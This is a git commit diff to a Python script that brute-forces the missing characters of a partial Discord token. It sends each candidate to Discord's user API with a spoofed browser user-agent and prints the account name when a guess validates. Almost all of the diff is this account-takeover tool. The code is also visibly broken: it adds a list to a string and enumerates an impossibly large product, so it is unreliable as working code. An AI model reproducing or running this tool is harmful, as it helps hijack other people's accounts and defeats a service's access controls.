abcb5e7190c0eac91f2ce8422e4126e18402901c
Gary <gary.github@gmail.com>
2022-04-07 10:22:22 +0800

    Logic fix

--- token-guess/main.py
+++ token-guess/main.py
@@ -1,4 +1,5 @@
 import concurrent.futures
+import itertools 
 import string
 import sys
 import urllib
@@ -14,24 +15,19 @@ TOKEN_PATTERN = "/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/"
 TOKEN_CHARS = string.ascii_letters + string.digits + "_"
 
 
-inputToken = ""
-if not inputToken:
+# Variables
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
+inputToken = "" 
+if not inputToken: 
     inputToken = input("Enter your token: ")
 guessLength = TOKEN_LENGTH - len(inputToken)
-combos = [i + j for i in TOKEN_CHARS for j in TOKEN_CHARS]
-c = len(combos)
+products = ["".join(p) for p in itertools.product(TOKEN_CHARS, repeat=guessLength)]
+p = len(products)
 
 
 def validateToken(token, bot=True):
-    if bot:
-        token = "Bot " + token
-    req = Request(
-        "https://discord.com/api/v9/users/@me", 
-        headers={
-            "Authorization": token,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
-        }
-    )
+    headers["Authorization"] = ("Bot " if bot else "") + token
+    req = Request("https://discord.com/api/v9/users/@me", headers=headers)
     try:
         response = urllib.request.urlopen(req)
         # json to dict
@@ -50,17 +46,17 @@ def validateToken(token, bot=True):
 if __name__ == '__main__':
     futures = []
     executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)  # beware cloudflare
-    for combo in combos:
-        testToken = inputToken + combos
+    for combo in products:
+        testToken = inputToken + products
         futures.append(executor.submit(validateToken, testToken))
 
-    with tqdm(total=c) as pbar:
+    with tqdm(total=p) as pbar:
         for future in concurrent.futures.as_completed(futures):
             try:
                 data = future.result()
                 if data:
                     print(f'Found token: {data["token"]}, {data["username"]}#{data["discriminator"]}')
-                    pbar.update(c - pbar.n)
+                    pbar.update(p - pbar.n)
                     pbar.close()
                     sys.exit(0)
             except:
